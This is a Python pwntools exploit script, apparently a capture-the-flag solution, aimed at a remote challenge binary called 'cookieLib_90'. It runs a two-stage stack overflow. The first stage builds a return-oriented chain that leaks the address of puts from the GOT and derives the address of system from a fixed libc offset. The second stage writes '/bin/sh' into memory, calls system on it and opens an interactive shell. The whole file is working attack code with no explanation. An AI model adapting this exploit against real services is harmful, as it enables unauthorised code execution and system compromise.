from pwn import *

#p = process('./cookieLib_90')
p = remote('p1.tjctf.org', 8010)
e = ELF('./cookieLib_90')

#gdb.attach(p)

main = 0x400797
cookie = 0x601020
poprdi = 0x400933
ret = 0x4008c4
system_offset = 0x31580

# ==== first step: leak puts@got ====
print p.recvuntil('tasty?\n')
payload = ''
payload += 'a'*0x50
payload += 'b'*0x8
payload += p64(poprdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(main)
p.sendline(payload)

sleep(0.5)

print p.recvuntil('anymore\n')
puts_addr = unpack(p.recvline().replace('\n',''), 'all', endian='little', sign=False)
system_addr = puts_addr - system_offset

log.info('puts @ addr %#x' % (puts_addr))
log.info('system @ addr %#x' % (system_addr))

# ==== second step: return to system('/bin/sh') ====
print p.recvuntil('tasty?\n')
payload = ''
payload += 'a'*0x50
payload += 'b'*0x8
payload += p64(poprdi)
payload += p64(cookie)
payload += p64(e.plt['gets'])
payload += p64(poprdi)
payload += p64(cookie)
payload += p64(system_addr)
p.sendline(payload)
log.info('send payload that call system')

sleep(0.5)

p.sendline('/bin/sh\x00')
log.info('write /bin/sh on cookie')

sleep(0.5)

p.interactive()
